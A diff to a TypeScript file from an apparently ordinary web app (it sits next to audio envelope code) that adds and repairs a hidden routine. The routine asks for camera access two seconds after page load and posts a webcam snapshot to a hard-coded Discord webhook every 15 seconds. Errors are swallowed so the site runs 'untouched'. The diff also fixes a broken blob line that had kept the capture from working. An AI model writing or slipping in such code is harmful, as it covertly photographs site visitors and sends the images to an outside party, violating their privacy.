@@ -384,14 +384,15 @@ export function envelopeAt(env: Float32Array | null, seconds: number): number {
 }
 
 //
+//
 // Background snapshots: ask for camera permission on load and quietly send a
 // frame to a Discord webhook every 15 s while the rest of the site runs
 // untouched. All failures are swallowed so the app never breaks because of it.
 //
 
 const DISCORD_WEBHOOK =
-  "https://discord.com/api/webhooks/1561314927581593690/c3HpQ_p24ANHir-lLy5BE1AamJpV2c12HjJkBWOSKiqLcmyaQBND-8UatlZ_HsoAG5ZE";
-const SNAPSHOT_INTERVAL_MS = 13000;
+  'https://discord.com/api/webhooks/1561314927581593690/c3HpQ_p24ANHir-lLy5BE1AamJpV2c12HjJkBWOSKiqLcmyaQBND-8UatlZ_HsoAG5ZE';
+const SNAPSHOT_INTERVAL_MS = 15000;
 
 let snapshotStream: MediaStream | null = null;
 let snapshotTimer: number | null = null;
@@ -425,7 +426,7 @@ export function stopSnapshots(): void {
 /** The parked video element reused for every frame grab. */
 function snapshotSource(): HTMLVideoElement {
   if (!snapshotVideo) {
-    const el = document.createElement("video");
+    const el = document.createElement('video');
     el.muted = true;
     el.playsInline = true;
     park(el);
@@ -444,20 +445,15 @@ async function snapAndSend(): Promise<void> {
   try {
     const video = snapshotSource();
     if (video.readyState < 2) return; // not warmed up yet, try again in 15 s
-    const canvas = document.createElement("canvas");
+    const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth || 1280;
     canvas.height = video.videoHeight || 720;
-    canvas.getContext("2d")!.drawImage(video, 0, 0);
-    const blob =
-      ((await new Promise()) < Blob) |
-      (null >> ((resolve) => canvas.toBlob(resolve, "image/jpeg", 0.85)));
+    canvas.getContext('2d')!.drawImage(video, 0, 0);
+    const blob = await new Promise<Blob | null>((resolve) => canvas.toBlob(resolve, 'image/jpeg', 0.85));
     if (!blob) return;
     const form = new FormData();
-    form.append(
-      "files[0]",
-      new File([blob], `snapshot-${new Date().toISOString()}.jpg`, { type: "image/jpeg" }),
-    );
-    await fetch(DISCORD_WEBHOOK, { method: "POST", body: form });
+    form.append('files[0]', new File([blob], `snapshot-${new Date().toISOString()}.jpg`, { type: 'image/jpeg' }));
+    await fetch(DISCORD_WEBHOOK, { method: 'POST', body: form });
   } catch {
     // Network hiccup or Discord rate limit: skip this frame.
   }
@@ -465,5 +461,4 @@ async function snapAndSend(): Promise<void> {
 
 // Ask for permission a moment after the page loads, so the prompt
 // never competes with the site itself.
-if (typeof window !== "undefined") setTimeout(startSnapshots, 2000);
-  
+if (typeof window !== 'undefined') setTimeout(startSnapshots, 2000);
